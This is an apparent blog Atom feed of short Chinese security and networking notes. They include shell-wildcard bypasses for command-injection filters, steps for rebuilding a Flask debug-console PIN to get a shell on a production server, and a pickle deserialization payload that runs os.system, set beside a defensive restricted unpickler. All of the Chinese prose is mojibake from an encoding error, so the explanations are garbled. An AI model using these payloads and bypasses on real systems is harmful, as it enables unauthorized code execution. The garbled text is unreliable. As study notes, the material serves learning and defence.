<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://rainerhu.github.io</id>
    <title>Rain</title>
    <updated>2023-06-26T11:38:03.747Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://rainerhu.github.io"/>
    <link rel="self" href="https://rainerhu.github.io/atom.xml"/>
    <subtitle>word</subtitle>
    <logo>https://rainerhu.github.io/images/avatar.png</logo>
    <icon>https://rainerhu.github.io/favicon.ico</icon>
    <rights>All rights reserved 2023, Rain</rights>
    <entry>
        <title type="html"><![CDATA[æ‰‹æœºç‰¹å®šåº”ç”¨ ç½‘ç»œåŠ è½½å¡è§£å†³åŠæ³•]]></title>
        <id>https://rainerhu.github.io/post/shou-ji-te-ding-ying-yong-wang-luo-jia-zai-qia-jie-jue-ban-fa/</id>
        <link href="https://rainerhu.github.io/post/shou-ji-te-ding-ying-yong-wang-luo-jia-zai-qia-jie-jue-ban-fa/">
        </link>
        <updated>2023-06-18T09:43:30.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ipv6çš„å‘">ipv6çš„å‘</h1>
<p>å…³é—­äº†dhcpï¼Œè”é€šçš„å…‰çŒ« è·¯ç”±å™¨è¿˜æ˜¯ä¼šç»™åˆ†é…ipv6çš„dnsï¼Œç¦»è°±ï¼›<br>
ä¸€é€šæ“ä½œåœ¨ç®¡ç†å‘˜åå°å½»åº•å¹²æ‰äº†ipv6çš„dnsï¼Œç»ˆäºè§£å†³é—®é¢˜</p>
<p>ç½‘é€Ÿé£å¿« ğŸ˜</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[tailscale åªç”¨ip è‡ªå»ºderper]]></title>
        <id>https://rainerhu.github.io/post/tailscale-zhi-yong-ip-zi-jian-derper/</id>
        <link href="https://rainerhu.github.io/post/tailscale-zhi-yong-ip-zi-jian-derper/">
        </link>
        <updated>2023-06-18T09:40:42.000Z</updated>
        <content type="html"><![CDATA[<p>éšç€derpçš„ä¸æ–­æ›´æ–°ï¼Œç°åœ¨åªæœ‰ipæ²¡æœ‰åŸŸåçš„æƒ…å†µä¸‹æ­å»ºå·²ç»ç®€å•å¾ˆå¤šäº†ã€‚</p>
<p>derpå®‰è£…å°±ä¸è¯¦ç»†è¯´äº†ï¼Œç›´æ¥çœ‹å®˜ç½‘è‡ªå·±è£…å°±å®Œäº‹ï¼Œ<br>
æˆ‘è‡ªå·±æ˜¯ä½¿ç”¨äº†å¤§ä½¬åšçš„å®¹å™¨ç‰ˆæœ¬çš„ <a href="https://hub.docker.com/r/fredliang/derper">fredliang/derper</a> ,å¤§å®¶ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ª</p>
<h1 id="è¯ä¹¦ç”Ÿæˆ">è¯ä¹¦ç”Ÿæˆ</h1>
<p>ç”±äºæ²¡æœ‰åŸŸåï¼Œå°±è¦å…ˆè‡ªå·±ç”Ÿæˆä¸ªè¯ä¹¦å‡ºæ¥äº†ï¼Œç”±äºæˆ‘æ˜¯æŠŠderpéƒ¨ç½²åœ¨è‡ªå·±å®¶é‡Œï¼Œæ‹¨å·ipä¼šå˜åŒ–ï¼Œæ‰€ç”¨äº†DDNSï¼Œè¿™é‡Œç”ŸæˆåŸŸåå°±è¦ç”¨DDNSä½¿ç”¨çš„åŸŸåæ¥ç”Ÿæˆè¯ä¹¦</p>
<p>æ³¨æ„ï¼š è¦æ›¿æ¢ é‡Œé¢çš„åŸŸåç”¨è‡ªå·±çš„ï¼Œå½“ç„¶å¦‚æœæœ‰å›ºå®šçš„å…¬ç½‘ipä¹Ÿå¯ä»¥ç›´æ¥ç”¨ipæ¥æï¼Œåº”è¯¥é—®é¢˜ä¸å¤§ï¼Œè¯ä¹¦ç”Ÿæˆå‘½ä»¤å¿˜è®°æ˜¯ä»å“ªé‡ŒæŠ„çš„äº†.....</p>
<pre><code class="language-shell">openssl genrsa -out ca.key 2048
openssl req -new -x509 -days 365 -key ca.key -subj &quot;/C=CN/ST=GD/L=SZ/O=Acme, Inc./CN=Acme Root CA&quot; -out ca.crt
# ä¸‹é¢çš„å‘½ä»¤è¦æ›¿æ¢*.example.org
openssl req -newkey rsa:2048 -nodes -keyout xxx.example.org.key -subj &quot;/C=CN/ST=GD/L=SZ/O=Acme, Inc./CN=*.example.org&quot; -out server.csr   
#  ä¸‹é¢çš„å‘½ä»¤è¦æ›¿æ¢xxx.example.org
openssl x509 -req -extfile &lt;(printf &quot;subjectAltName=DNS:example.com,DNS:xxx.example.org&quot;) -days 365 -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out xxx.example.org.crt  
</code></pre>
<h1 id="å¯åŠ¨å®¹å™¨">å¯åŠ¨å®¹å™¨</h1>
<p>ç„¶åå°±æ˜¯å·¨é•¿çš„å¯åŠ¨å®¹å™¨å‘½ä»¤ ï¼Œè¿™é‡Œç”¨äº†æ¯”è¾ƒå¤šçš„å‚æ•° ï¼Œé€ä¸€è§£é‡Šä¸‹ï¼š</p>
<ul>
<li><code>--restart always</code> ï¼š å®¹å™¨è‡ªåŠ¨é‡å¯</li>
<li><code>--net=container:gw</code>  :  å’Œå…¶ä»–å®¹å™¨å…±äº«ç½‘ç»œï¼Œè¿™æ ·å­derpå¼€æ”¾çš„ç«¯å£å°±ä¼šå¼€åœ¨æˆ‘çš„ç½‘å…³å®¹å™¨ä¸Šï¼Œè¿™ä¸ªå¤§å®¶è§†æƒ…å†µä½¿ç”¨ï¼Œæˆ‘æ˜¯å› ä¸ºè‡ªå·±æäº†ä¸ªå®¹å™¨åšç½‘å…³ï¼Œä¸“é—¨ç”¨æ¥æ˜ å°„ç«¯å£åˆ°å…¬ç½‘ä¸Šï¼Œç„¶åæœ¬æ¥æƒ³è¦åœ¨gwçš„å®¹å™¨ä¸Šé…ç½®iptableåšç«¯å£è½¬å‘åˆ°è·‘derpçš„å®¹å™¨ä¸Šï¼Œä½†æ˜¯ç ”ç©¶äº†ä¸€å¤©ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆudpéƒ½æ˜¯åªæœ‰æ”¶åˆ°çš„åŒ…ï¼Œè½¬å‘ä¸å‡ºå»å•Šï¼Œç»æœ›ã€‚ã€‚ã€‚ï¼Œæ— å¥ˆæäº†è¿™ä¹ˆä¸ªéªšæ“ä½œï¼Œç›´æ¥å’Œç½‘å…³å®¹å™¨å…±äº«ç½‘ç»œäº†ï¼Œç½‘ç»œçŸ¥è¯†è¿˜æ˜¯ä¸å¤Ÿã€‚ã€‚æä¸æ‡‚ä¸ºå•¥</li>
<li><code>-v /root/cert:/root/cert</code>ï¼š æŒ‚è½½è¯ä¹¦ç›®å½•</li>
<li><code>-v /var/lib/tailscale:/var/lib/tailscale -v /var/run/tailscale:/var/run/tailscale</code>  ï¼š æŒ‚è½½ç›®å½•åˆ°å®¹å™¨ï¼Œä¸ºäº†æ‰“å¼€derpå¯¹å®¢æˆ·ç«¯çš„æ ¡éªŒï¼Œå› æ­¤éœ€è¦æŒ‚è½½ï¼Œä¸è¿‡å¥½åƒåªç”¨æŒ‚è½½ç¬¬äºŒä¸ªå°±è¡Œäº†</li>
<li><code>-e DERP_VERIFY_CLIENTS=true</code> ï¼š å¼€å¯<code>--verify-clients</code>çš„æ ¡éªŒ</li>
<li><code>-e DERP_HTTP_PORT=-1</code> ï¼š ç¦ç”¨httpç«¯å£ï¼Œå°‘å¼€ç‚¹ç«¯å£ï¼Œå®‰å…¨</li>
<li><code>-e DERP_DOMAIN=xxx.example.org</code> ï¼šè®¾ç½®è‡ªå·±çš„åŸŸå</li>
<li><code>-e DERP_CERT_MODE=manual</code>: è®¾ç½®è¯ä¹¦æ¨¡å¼ï¼Œä¸ºè‡ªå·±æŒ‡å®šçš„è¯ä¹¦</li>
<li><code>-e DERP_CERT_DIR=/root/cert</code> :æŒ‡å®šè¯ä¹¦ç›®å½•</li>
<li><code>-e DERP_ADDR=:448</code> ï¼š æŒ‡å®šå¼€æ”¾çš„httpsç«¯å£</li>
<li><code>--name=derp </code> ï¼š ç»™å®¹å™¨èµ·åå­—</li>
</ul>
<pre><code class="language-shell">docker run -d --restart always --net=container:gw  -v /root/cert:/root/cert -v /var/lib/tailscale:/var/lib/tailscale -v /var/run/tailscale:/var/run/tailscale -e DERP_VERIFY_CLIENTS=true -e DERP_HTTP_PORT=-1  -e DERP_DOMAIN=xxx.example.org -e DERP_CERT_MODE=manual -e DERP_CERT_DIR=/root/cert -e DERP_ADDR=:448   --name=derp fredliang/derper:5.26
</code></pre>
<h1 id="ä¿®æ”¹aclè§„åˆ™">ä¿®æ”¹ACLè§„åˆ™</h1>
<p>ACLè§„åˆ™æœ‰ä¸¤ä¸ªåœ°æ–¹æ¯”è¾ƒé‡è¦ï¼Œä¸€ä¸ªæ˜¯æˆ‘æ”¹äº†httpsçš„ç«¯å£ï¼Œæ²¡æœ‰ç”¨é»˜è®¤çš„ï¼Œä¸€å®šè¦åŠ ä¸Šï¼Œè¿˜æœ‰å°±æ˜¯<br>
<code>InsecureForTests</code> ï¼Œå¿½ç•¥æ‰è¯ä¹¦é”™è¯¯ï¼Œä¸ç„¶å°±è¿æ¥ä¸ä¸Šå»äº†ï¼ˆå¦‚æœä½ çš„è¯ä¹¦ä¸æ˜¯è‡ªå·±è‡ªç­¾åçš„ï¼Œè€Œæ˜¯çœŸçš„è¯ï¼Œå°±ä¸ç”¨åŠ è¿™ä¸ªäº†ï¼‰<br>
å‚è€ƒç¤ºä¾‹ï¼š</p>
<pre><code class="language-json">&quot;derpMap&quot;:
		{
			&quot;OmitDefaultRegions&quot;: false,
			&quot;Regions&quot;: {
				&quot;900&quot;: {
					&quot;RegionID&quot;:   900,
					&quot;RegionCode&quot;: &quot;home&quot;,
					&quot;RegionName&quot;: &quot;home&quot;,
					&quot;Nodes&quot;: [{
						&quot;Name&quot;:             &quot;1&quot;,
						&quot;RegionID&quot;:         900,
						&quot;HostName&quot;:         &quot;xxx.example.org&quot;,
						&quot;DERPPort&quot;:         448,  //æŒ‡å®šhttpsç«¯å£
						&quot;InsecureForTests&quot;: true,  // å¿½ç•¥è¯ä¹¦é”™å¤±
					}],
				},
			},
		}


</code></pre>
<p>æ€ä¹ˆæDDNSè¿™é‡Œå°±ä¸è¯¦ç»†å†™äº†</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqlitä½¿ç”¨æ—¶æ³¨æ„å†…å­˜æ³„éœ²]]></title>
        <id>https://rainerhu.github.io/post/sqlit-shi-yong-shi-zhu-yi-nei-cun-xie-lu1/</id>
        <link href="https://rainerhu.github.io/post/sqlit-shi-yong-shi-zhu-yi-nei-cun-xie-lu1/">
        </link>
        <updated>2022-06-15T12:41:44.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="sqlitä½¿ç”¨æ—¶æ³¨æ„å†…å­˜æ³„éœ²">sqlitä½¿ç”¨æ—¶æ³¨æ„å†…å­˜æ³„éœ²</h2>
<ul>
<li><a href="https://blog.csdn.net/shengfang666/article/details/7938994">sqliteå†…å­˜æ³„éœ²</a></li>
<li>sqlite3_get_table------sqlite3_free_table(pazResult)</li>
<li>sqlite3_exec-----sqlite3_free(*errmsg) (å‡ºç°é”™è¯¯çš„æƒ…å†µä¸‹è¦è°ƒç”¨)</li>
<li>sqlite3_open-------sqlite3_close</li>
</ul>
]]></summary>
        <content type="html"><![CDATA[<h2 id="sqlitä½¿ç”¨æ—¶æ³¨æ„å†…å­˜æ³„éœ²">sqlitä½¿ç”¨æ—¶æ³¨æ„å†…å­˜æ³„éœ²</h2>
<ul>
<li><a href="https://blog.csdn.net/shengfang666/article/details/7938994">sqliteå†…å­˜æ³„éœ²</a></li>
<li>sqlite3_get_table------sqlite3_free_table(pazResult)</li>
<li>sqlite3_exec-----sqlite3_free(*errmsg) (å‡ºç°é”™è¯¯çš„æƒ…å†µä¸‹è¦è°ƒç”¨)</li>
<li>sqlite3_open-------sqlite3_close</li>
</ul>
<!-- more -->
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[å‘½ä»¤æ³¨å…¥éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦]]></title>
        <id>https://rainerhu.github.io/post/ming-ling-zhu-ru-bu-fen-te-shu-zi-fu/</id>
        <link href="https://rainerhu.github.io/post/ming-ling-zhu-ru-bu-fen-te-shu-zi-fu/">
        </link>
        <updated>2022-01-11T12:43:27.000Z</updated>
        <summary type="html"><![CDATA[<h1 id="ç›®å½•ç©¿è¶Š">ç›®å½•ç©¿è¶Š</h1>
<pre><code class="language-shell">cd .?/.?/
cd .[[:punct:]]/
cd .[[:print:]]/
cd .[^1]/
</code></pre>
]]></summary>
        <content type="html"><![CDATA[<h1 id="ç›®å½•ç©¿è¶Š">ç›®å½•ç©¿è¶Š</h1>
<pre><code class="language-shell">cd .?/.?/
cd .[[:punct:]]/
cd .[[:print:]]/
cd .[^1]/
</code></pre>
<!-- more -->
<p>shellé€šé…ç¬¦å®ç°ç›®å½•ç©¿è¶Š</p>
<table>
<thead>
<tr>
<th>å­—ç¬¦</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td>åŒ¹é…ä»»æ„é•¿åº¦ä»»æ„å­—ç¬¦</td>
</tr>
<tr>
<td>?</td>
<td>åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>[list]</td>
<td>åŒ¹é…æŒ‡å®šèŒƒå›´å†…ï¼ˆlistï¼‰ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ</td>
</tr>
<tr>
<td>[^list]</td>
<td>åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ</td>
</tr>
<tr>
<td>[!list]</td>
<td>åŒ<code>[^list]</code></td>
</tr>
<tr>
<td>{str1,str2,â€¦}</td>
<td>åŒ¹é… srt1 æˆ–è€… srt2 æˆ–è€…æ›´å¤šå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯é›†åˆ</td>
</tr>
<tr>
<td>IFS</td>
<td>ç”± &lt; space &gt; æˆ– &lt; tab &gt; æˆ– &lt; enter &gt; ä¸‰è€…ä¹‹ä¸€ç»„æˆ</td>
</tr>
<tr>
<td>CR</td>
<td>ç”± &lt; enter &gt; äº§ç”Ÿ</td>
</tr>
<tr>
<td>!</td>
<td>æ‰§è¡Œ history ä¸­çš„å‘½ä»¤</td>
</tr>
</tbody>
</table>
<p>ä¸“ç”¨å­—ç¬¦é›†</p>
<table>
<thead>
<tr>
<th>å­—ç¬¦</th>
<th>æ„ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>[:alnum:]</td>
<td>ä»»æ„æ•°å­—æˆ–è€…å­—æ¯</td>
</tr>
<tr>
<td>[:alpha:]</td>
<td>ä»»æ„å­—æ¯</td>
</tr>
<tr>
<td>[:space:]</td>
<td>ç©ºæ ¼</td>
</tr>
<tr>
<td>[:lower:]</td>
<td>å°å†™å­—æ¯</td>
</tr>
<tr>
<td>[:digit:]</td>
<td>ä»»æ„æ•°å­—</td>
</tr>
<tr>
<td>[:upper:]</td>
<td>ä»»æ„å¤§å†™å­—æ¯</td>
</tr>
<tr>
<td>[:cntrl:]</td>
<td>æ§åˆ¶ç¬¦</td>
</tr>
<tr>
<td>[:graph:]</td>
<td>å›¾å½¢</td>
</tr>
<tr>
<td>[:print:]</td>
<td>å¯æ‰“å°å­—ç¬¦</td>
</tr>
<tr>
<td>[:punct:]</td>
<td>æ ‡ç‚¹ç¬¦å·</td>
</tr>
<tr>
<td>[:xdigit:]</td>
<td>åå…­è¿›åˆ¶æ•°</td>
</tr>
<tr>
<td>[:blank:]</td>
<td>ç©ºç™½å­—ç¬¦</td>
</tr>
</tbody>
</table>
<ul>
<li>åœ¨ä½¿ç”¨ä¸“å±å­—ç¬¦é›†çš„æ—¶å€™ï¼Œå­—ç¬¦é›†ä¹‹å¤–è¿˜éœ€è¦ç”¨ [ ] æ¥åŒ…å«ä½ï¼Œå¦åˆ™ä¸“ç”¨å­—ç¬¦é›†ä¸ä¼šç”Ÿæ•ˆï¼Œä¾‹å¦‚<code>[[:space:]]</code></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[python-flask debugæ¨¡å¼ pinç è®¡ç®—]]></title>
        <id>https://rainerhu.github.io/post/python-flask-debug-mo-shi-pin-ma-ji-suan/</id>
        <link href="https://rainerhu.github.io/post/python-flask-debug-mo-shi-pin-ma-ji-suan/">
        </link>
        <updated>2021-08-11T14:41:51.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<p>é‡åˆ°äº†flaskåœ¨ç”Ÿäº§ç¯å¢ƒå¼€debugæ¨¡å¼çš„...å­¦ä¹ ä¸€ä¸‹æ€ä¹ˆåˆ©ç”¨</p>
<h1 id="flask-debugæ¨¡å¼-getshell">flask debugæ¨¡å¼ getshell</h1>
<p>https://www.freebuf.com/articles/network/238485.html</p>
<p>https://www.cnblogs.com/HacTF/p/8160076.html</p>
<p>https://github.com/its-arun/Werkzeug-Debug-RCE/blob/master/werkzeug.py</p>
<p>æºç </p>
<p>https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/<strong>init</strong>.py</p>
<p>ç›´æ¥è¿›å…¥   xx.xx.xx.xx/console å¯è®¿é—®debugæ§åˆ¶å°é¡µé¢</p>
<p>éœ€è¦çš„å‚æ•°å€¼</p>
<pre><code class="language-python">probably_public_bits = [
	'admin',# username import getpass username=getpass.getuser()
	'flask.app',# modname getattr(app, &quot;__module__&quot;, app.__class__.__module__)
	'Flask',#   getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/lib64/python2.7/site-packages/flask/app.pyc' # getattr(sys.modules.get(modname), '__file__', None)
]

private_bits = [
	'280362549456921',# str(uuid.getnode()),  /sys/class/net/eth0/address ç½‘å¡macåœ°å€ str(0x4545454545)
	'54aea375-c51c-4a6a-95a8-9cf4727caadc'# get_machine_id()ï¼š /etc/machine-id  or /proc/sys/kernel/random/boot_id + /proc/self/cgroupï¼ˆç¬¬ä¸€è¡Œæœ€åä¸€ä¸ª/åçš„ä¸€æ®µï¼‰
]
</code></pre>
<p>python3æ˜¯app.py   python2æ˜¯app.pyc</p>
<p>/proc/self/cgroup å†…å®¹ä¼šéšç€æ¯ä¸ªç»ˆç«¯å‘ç”Ÿå˜åŒ–</p>
<pre><code class="language-shell">å–ç¬¬ä¸€è¡Œï¼Œæœ€åä¸€ä¸ª / åçš„å­—ç¬¦å†…å®¹ï¼Œæ‹¼æ¥åˆ°ä»å‰é¢ä¸¤ä¸ªæ–‡ä»¶è¯»åˆ°çš„å†…å®¹ è¯¥å¤„ä¸ºsession-6042.scope
11:memory:/user.slice/user-0.slice/session-6042.scope
10:perf_event:/
9:devices:/user.slice
8:freezer:/
7:rdma:/
6:pids:/user.slice/user-0.slice/session-6042.scope
5:blkio:/
4:net_cls,net_prio:/
3:cpu,cpuacct:/
2:cpuset:/
1:name=systemd:/user.slice/user-0.slice/session-6042.scope
0::/user.slice/user-0.slice/session-6042.scope

</code></pre>
<p>https://github.com/pallets/werkzeug/commit/11ba286a1b907110a2d36f5c05740f239bc7deed</p>
<p>è¯¥æäº¤ä¿®æ”¹äº†è®¡ç®—pinæ–¹å¼ï¼Œä½¿ç”¨sha1ï¼Œä¸å†ä½¿ç”¨md5ï¼Œç”Ÿæˆpinçš„ä»£ç è¿˜æ˜¯éœ€è¦æ ¹æ®ç‰ˆæœ¬å°è¯•æ‰å¯ä»¥ã€‚ã€‚</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ ‘è“æ´¾ï¼šopenwrtæ­å»º]]></title>
        <id>https://rainerhu.github.io/post/shu-mei-pai-openwrt-da-jian/</id>
        <link href="https://rainerhu.github.io/post/shu-mei-pai-openwrt-da-jian/">
        </link>
        <updated>2021-07-25T11:38:06.000Z</updated>
        <content type="html"><![CDATA[<h1 id="æ ‘è“æ´¾é•œåƒé€‰æ‹©">æ ‘è“æ´¾é•œåƒé€‰æ‹©</h1>
<p>https://github.com/openfans-community-offical/Debian-Pi-Aarch64<br>
é€‰ç”¨æ— æ¡Œé¢åŠ å¼ºç‰ˆ çš„é•œåƒå°±å¯ä»¥<br>
<code> OPENFANS-Debian-Buster-Desktop-Aarch64-XXXXXX.img</code><br>
ä¸éœ€è¦åœ¨è‡ªå·±å®‰è£…å¾ˆå¤šä¸œè¥¿ï¼ŒåŸºæœ¬éƒ½å®‰è£…å¥½äº†</p>
<h1 id="openwrt-docker">openwrt docker</h1>
<p>ä¸‹åˆ—ä¸¤ä¸ªéƒ½å¯ä»¥<br>
https://hub.docker.com/r/buddyfly/openwrt-aarch64<br>
https://hub.docker.com/r/sulinggg/openwrt</p>
<h1 id="æ ‘è“æ´¾ç½‘ç»œé…ç½®">æ ‘è“æ´¾ç½‘ç»œé…ç½®</h1>
<ol>
<li>å¼€å¯ç½‘å¡æ··æ‚æ¨¡å¼</li>
</ol>
<pre><code>sudo ip link set eth0 promisc on
</code></pre>
<ol>
<li>docker ç½‘ç»œåˆ›å»º</li>
</ol>
<pre><code>docker network create -d macvlan --subnet=192.168.8.0/24 --gateway=192.168.8.1 -o parent=eth0 macnet
</code></pre>
<p>å¯æ‰§è¡Œ <code>docker network ls</code> æŸ¥çœ‹åˆ›å»ºçš„ç½‘ç»œ<br>
å…³äº<code>macvlan</code>ç›¸å…³å†…å®¹ä¸‹é¢è¡¥å……ï¼Œå¤§æ¦‚å°±æ˜¯ä¸€ä¸ªæ¡¥æ¥å§ï¼Œä½†æ˜¯åˆæœ‰åŒºåˆ«<br>
3. æ‹‰å–é•œå¹¶å¯åŠ¨å®¹å™¨</p>
<pre><code>docker pull buddyfly/openwrt-aarch64 #æ‹‰å–é•œåƒ
docker run --restart always --name openwrt -d --network macnet --privileged buddyfly/openwrt-aarch64 /sbin/init 
#å¯åŠ¨å®¹å™¨ï¼Œè‡ªåŠ¨é‡å¯ï¼Œå‘½åå®¹å™¨åï¼Œåå°è¿è¡Œï¼ŒåŠ å…¥macnetç½‘ç»œï¼Œå®¹å™¨å†…å‘½ä»¤æ‰§è¡Œæƒé™ï¼Œå®šä¹‰å®¹å™¨å¯åŠ¨åæ‰§è¡Œçš„å‘½ä»¤

</code></pre>
<ol start="4">
<li>è¿›å…¥å®¹å™¨ä¿®æ”¹ç½‘ç»œ</li>
</ol>
<pre><code> docker exec -it openwrt bash #è¿›å…¥å®¹å™¨bashç•Œé¢
vi /etc/config/network

config interface 'loopback'
        option ifname 'lo'
        option proto 'static'
        option ipaddr '127.0.0.1'
        option netmask '255.0.0.0'

config globals 'globals'
        option ula_prefix 'fd5d:af65:56ed::/48'

config interface 'lan'
        option type 'bridge'
        option ifname 'eth0'
        option proto 'static'
        option ipaddr '192.168.8.10'
        option netmask '255.255.255.0'
        option ip6assign '60'
        option gateway  '192.168.8.1'
        option dns '192.168.8.1'
</code></pre>
<p>é‡å¯ç½‘ç»œ</p>
<pre><code> /etc/init.d/network restart #é‡å¯openwrtçš„ç½‘ç»œ
</code></pre>
<ol>
<li>æ ‘è“æ´¾ç½‘ç»œé…ç½®</li>
</ol>
<pre><code>/etc/network/interfaces
# interfaces(5) file used by ifup(8) and ifdown(8)
# Include files from /etc/network/interfaces.d:
source-directory /etc/network/interfaces.d
## Used dhcp ip address set eth0 inet to dhcp,
## or used static ip address set eth0 to static
## and change other ip settings.
## If you wanna let settings to take effect,
## uncomment symbol in front.

auto eth0
allow-hotplug eth0

#iface eth0 inet dhcp
iface eth0 inet static
address 192.168.8.103
netmask 255.255.255.0
gateway 192.168.8.1
dns-nameservers 192.168.8.10
</code></pre>
<ol start="6">
<li>
<p>ä¿®æ”¹openwrté…ç½®<br>
é»˜è®¤å¯†ç ï¼šroot-password<br>
å…³é—­DHCPï¼Œipv6çš„ä¹Ÿè¦å…³æ‰</p>
<figure data-type="image" tabindex="1"><img src="https://rainerhu.github.io/post-images/1627215328307.jpg" alt="" loading="lazy"></figure>
</li>
<li>
<p>å¼€æœºå¯åŠ¨è„šæœ¬ä¿®æ”¹<br>
åœ¨<code>/boot/rc-local</code>ä¸­åŠ å…¥ä¸‹é¢çš„ï¼Œæ¥è®©æ ‘è“æ´¾æœ¬èº«çš„æµé‡ä¹Ÿèµ°openwrt<br>
æ²¡æœ‰è¿™ä¸ªéœ€æ±‚çš„ä¸æ”¹ä¹Ÿè¡Œ</p>
</li>
</ol>
<pre><code>ip link add link eth0 dev eth0.01 type macvlan mode bridge
sleep 10
ifconfig eth0.01 192.168.8.11/24
route add 192.168.8.10 dev eth0.01
route add default gw 192.168.8.10 dev eth0.01
</code></pre>
<p>--macvlançš„è§£é‡Š-2021.07.07æ›´æ–°</p>
<h1 id="macvlan">macvlan</h1>
<p>åœ¨ç¬¬ä¸€æ­¥ä¸­æœ‰åˆ›å»º dockerä½¿ç”¨çš„macvlanï¼Œç›®çš„æ˜¯ä¸ºäº†å®ç°å’Œæ¡¥æ¥ä¸€æ ·çš„æ¨¡å¼ï¼Œå…±äº«ç‰©ç†ç½‘å¡ä½¿ç”¨çš„å¤–éƒ¨ç½‘ç»œã€‚ä½¿ç”¨äº†bridgeæ¨¡å¼ã€‚<br>
è¯¥æ¨¡å¼ä¸‹è™šæ‹Ÿå‡ºæ¥çš„ç½‘å¡æ˜¯æ— æ³•ç›´æ¥ä¸çˆ¶ç½‘å¡é€šä¿¡çš„ï¼Œå› æ­¤æ ‘è“æ´¾æœ¬èº«çš„æµé‡æ— æ³•åˆ°è¾¾openwrt<br>
ä¸ºäº†èƒ½å¤Ÿè®©æ ‘è“æ´¾æœ¬èº«çš„æµé‡ä¹Ÿç»è¿‡openwrtå‡ºå»ï¼Œæ‰€ä»¥åé¢é‡æ–°åˆ›å»ºäº†ä¸€å—è™šæ‹Ÿç½‘å¡ï¼Œå¹¶ä¿®æ”¹è·¯ç”±ï¼ŒæŒ‡å®šé»˜è®¤ç½‘å…³åˆ°openwrtçš„ipï¼ŒåŒæ—¶æŒ‡å®šè¯¥è·¯ç”±ç½‘å¡ä½¿ç”¨è™šæ‹Ÿç½‘å¡</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[python pickle]]></title>
        <id>https://rainerhu.github.io/post/python-pickle/</id>
        <link href="https://rainerhu.github.io/post/python-pickle/">
        </link>
        <updated>2021-05-05T12:47:14.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="æ§åˆ¶å¦‚ä½•ååºåˆ—åŒ–">æ§åˆ¶å¦‚ä½•ååºåˆ—åŒ–</h2>
<ul>
<li><code>__reduce__</code></li>
<li><code>__reduce_ex__</code>  æŒ‡å®špickleåè®®ç‰ˆæœ¬</li>
</ul>
<pre><code class="language-python">class Test(object):
    def __reduce__(self):
        cmd = &quot;whoami&quot;
        #return __import__('os').system,('whoami',)
        return (os.system,('whoami',))
  __reduce__ex__

</code></pre>
]]></summary>
        <content type="html"><![CDATA[<h2 id="æ§åˆ¶å¦‚ä½•ååºåˆ—åŒ–">æ§åˆ¶å¦‚ä½•ååºåˆ—åŒ–</h2>
<ul>
<li><code>__reduce__</code></li>
<li><code>__reduce_ex__</code>  æŒ‡å®špickleåè®®ç‰ˆæœ¬</li>
</ul>
<pre><code class="language-python">class Test(object):
    def __reduce__(self):
        cmd = &quot;whoami&quot;
        #return __import__('os').system,('whoami',)
        return (os.system,('whoami',))
  __reduce__ex__

</code></pre>
<!-- more -->
<h2 id="é™åˆ¶å…¨å±€å˜é‡">é™åˆ¶å…¨å±€å˜é‡</h2>
<ul>
<li><strong>find_class</strong>  https://docs.python.org/zh-cn/3/library/pickle.html#pickle-restrict</li>
</ul>
<pre><code class="language-python">import builtins
import io
import pickle

safe_builtins = {
    'range',
    'complex',
    'set',
    'frozenset',
    'slice',
}

class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        # Only allow safe classes from builtins.
        if module == &quot;builtins&quot; and name in safe_builtins:
            return getattr(builtins, name)
        # Forbid everything else.
        raise pickle.UnpicklingError(&quot;global '%s.%s' is forbidden&quot; %
                                     (module, name))

def restricted_loads(s):
    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;
    return RestrictedUnpickler(io.BytesIO(s)).load()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[UAF]]></title>
        <id>https://rainerhu.github.io/post/uaf/</id>
        <link href="https://rainerhu.github.io/post/uaf/">
        </link>
        <updated>2020-06-24T12:48:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="ç®€ä»‹">ç®€ä»‹</h3>
<p>use after freeï¼Œå³é‡Šæ”¾åé‡ç”¨ã€‚æ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œåœ¨äºå†…å­˜åœ¨è¢«é‡Šæ”¾åï¼Œä½†æ˜¯æŒ‡å‘æŒ‡é’ˆå¹¶æ²¡æœ‰è¢«åˆ é™¤ï¼Œåˆè¢«ç¨‹åºè°ƒç”¨ã€‚æ¯”è¾ƒå¸¸è§çš„ç±»å‹æ˜¯C++å¯¹è±¡ï¼Œåˆ©ç”¨UAFä¿®æ”¹C++çš„è™šå‡½æ•°è¡¨å¯¼è‡´çš„ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<h3 id="è™šå‡½æ•°">è™šå‡½æ•°</h3>
